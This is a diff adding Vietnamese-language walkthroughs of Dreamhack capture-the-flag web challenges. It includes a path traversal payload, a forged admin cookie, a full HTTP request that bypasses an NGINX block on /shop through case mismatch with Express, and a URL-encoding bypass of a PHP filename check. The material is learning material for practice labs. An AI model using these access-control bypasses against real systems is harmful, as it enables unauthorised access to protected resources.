@@ -93,4 +93,32 @@ userid=1/../../../api/flag
 ```
 ### cookie
 ```Cookie: sessionid=6c292920; username=admin```
-## level 1
+## Level 1
+### baby-Case
+- muốn lấy được flag thì phải vào /shop, nhưng NGINX đã chặn path này.
+
+  ![image](https://github.com/user-attachments/assets/ed349cc1-2ceb-474d-b815-57c48ea3716b)
+
+- Chúng ta có thể lợi dụng việc sử lý URL của Express và NGINX để bypass ```/shop = /sHOP```
+- Tiếp theo là bypass hàm ```search``` bằng cách thêm một kí tự lowcase vào data.
+
+![image](https://github.com/user-attachments/assets/ee084983-0396-4a90-b253-9529a465ebe0)
+
+```
+POST /sHop HTTP/1.1
+Host: host3.dreamhack.games:16045
+Accept-Language: en-US
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 8
+
+leg=FlAG
+```
+### simple-phparse
+- URLencode for win
+```http://host3.dreamhack.games:13101/fl%61g.php```
+###
